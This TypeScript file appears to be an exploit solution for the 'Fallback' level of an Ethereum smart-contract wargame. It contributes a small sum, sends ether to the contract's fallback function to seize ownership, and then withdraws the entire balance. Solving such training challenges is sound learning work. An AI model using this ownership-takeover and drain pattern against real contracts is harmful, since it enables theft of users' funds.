import { Fallback } from '../../typechain-types/contracts/levels/Fallback';
import { EthereumClient } from '../ethereum/ethereum-client';
import { Attacker } from './attacker-provider';

export const FALLBACK_LEVEL_NAME = "Fallback"

export const fallbackAttacker = (): Attacker => {
    return {
        attack: async (client: EthereumClient, instanceAddress: string) => {
            const contract = await client.getContract<Fallback>(FALLBACK_LEVEL_NAME, instanceAddress);

            const contributeAmountGwei = 1000;

            console.log(`Contributing ${contributeAmountGwei}gwei to contract.`);
            const contributeTx = await contract.contribute({ value: contributeAmountGwei });
            await contributeTx.wait();

            console.log(`Sending ${contributeAmountGwei}gwei to fallback function.`);
            const fallbackTx = await client.sendRawTx({ to: instanceAddress, value: contributeAmountGwei });
            await fallbackTx.wait();

            console.log(`Withdrawing all the money!`);
            const withdrawTx = await contract.withdraw();
            await withdrawTx.wait();
        }
    }
}